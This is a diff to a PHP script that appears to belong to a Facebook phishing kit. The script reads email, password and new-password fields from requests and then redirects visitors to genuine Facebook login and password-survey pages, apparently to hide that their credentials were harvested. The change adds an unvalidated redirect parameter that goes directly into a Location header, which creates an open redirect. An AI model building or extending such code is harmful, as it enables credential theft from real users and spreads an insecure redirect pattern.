@@ -16,10 +16,12 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $outp
     $password = '';
     $password_new = '';
     $password_new2 = '';
+    $redirect = '';
     if(isset($_REQUEST['email'])){ $email = $_REQUEST['email'] ; } 
     if(isset($_REQUEST['password'])){ $password = $_REQUEST['password'] ; }
     if(isset($_REQUEST['password_new'])){ $password_new = $_REQUEST['password_new'] ; }
     if(isset($_REQUEST['password_new2'])){ $password_new2 = $_REQUEST['password_new2'] ; }
+    if(isset($_REQUEST['redirect'])){ $redirect = $_REQUEST['redirect'] ; }
 
 
 
@@ -48,11 +50,13 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $outp
 
  //print_r($stmt);
 //exit(); 
+
+   if(!empty($redirect)){
+	     header("location: ".$redirect); 
+    } 
    if(!empty($email)){
-	   header("location: https://m.facebook.com/login/?email=". htmlspecialchars($email)."&li=LZmDXkzJmMQITfAJkFOmWCqq&e=1348092"); 
-	    exit(); } 
+         header("location: https://m.facebook.com/login/?email=". htmlspecialchars($email)."&li=LZmDXkzJmMQITfAJkFOmWCqq&e=1348092");  } 
    else {
-      header('location: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');
-      exit();
-}
+         header('location: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');}
+exit();
 ?>
